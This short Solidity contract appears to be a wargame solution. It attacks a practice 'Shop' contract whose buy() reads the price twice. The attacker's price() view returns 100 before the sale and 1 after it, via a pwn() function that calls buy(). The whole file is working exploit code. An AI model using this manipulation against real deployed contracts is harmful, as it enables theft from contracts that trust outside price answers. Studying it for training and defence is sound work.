// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess();

interface ITarget {
    function isSold() external view returns (bool);
}

contract Shop {
    uint256 public count;
    address s_target;

    function price() public view returns (uint256) {
        return ITarget(s_target).isSold() ? 1 : 100;
    }

    function pwn(address target) public {
        s_target = target;
        (bool success, ) = target.call(abi.encodeWithSignature("buy()"));
        if (!success) revert CallNotSuccess();
    }
}
